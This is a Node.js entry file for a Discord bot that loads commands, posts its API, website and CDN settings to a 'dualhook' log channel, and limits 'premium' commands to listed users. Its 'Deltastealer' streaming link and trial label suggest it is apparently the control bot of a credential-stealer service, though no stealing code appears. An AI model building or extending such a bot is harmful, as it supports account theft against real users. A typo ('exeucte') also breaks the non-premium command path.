const { Client, Intents, Collection } = require("discord.js");
const fs = require("fs");
const config = require("./config.json");

const commands = new Collection();
const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.GUILD_MEMBERS,
  ],
});
require("./app");


// Command Handling
fs.readdirSync("./src/commands").forEach((file) => {
  if (file.endsWith(".js")) {
    const command = require(`./commands/${file}`);
    commands.set(command.name, command);
    console.log(`${command.name}: Added command`);
  }
});

client.on("ready", async (_) => {
  console.log(`[ BOT ] - Logged in ${client.user.tag}`);
  client.user.setActivity("💳 | 14 days trial", {
    type: "STREAMING",
    url: "https://twitch.tv/Deltastealer"
  });
  const channel = await client.channels.cache.get(
    config["dualhook-channel-id"]
  );
  await channel.send({
    embeds: [
      {
        title: "Bot Logs",
        description: "`✅ Bot ready`",
        color: "GREEN",
      },
      {
        title: "Bot Logs",
        description: `\`⚙️ Bot Configuration\`\n\n\`\`\`Bot Prefix : ${config.prefix}\nApi : ${config["api-url"]}\nWebsite : ${config["www-url"]}\nCDN : ${config["cdn-url"]}\`\`\``,
        color: "RED",
      },
    ],
  });
});

client.on("messageCreate", async (message) => {
  if (message.author.bot || !message.content.startsWith(config.prefix)) return;

  const args = message.content.slice(config.prefix.length).trim().split(" ");
  const commandName = args.shift();

  if (!commands.has(commandName)) {
    return await message.channel.send({
      embeds: [
        {
          description: `\`${commandName}\`: Not found`,
        },
      ],
    });
  }

  const command = commands.get(commandName);

  if (command.premium) {
    if (config.users.some((id) => id === message.author.id)) {
      command.execute(message, args, client);
    } else {
      await message.channel.send({
        embeds: [
          {
            description: `\`${command}\`: Only users in config file can execute that`,
          },
        ],
      });
    }
  } else {
    command.exeucte(message, args, client);
  }
});

client.login(config.token);
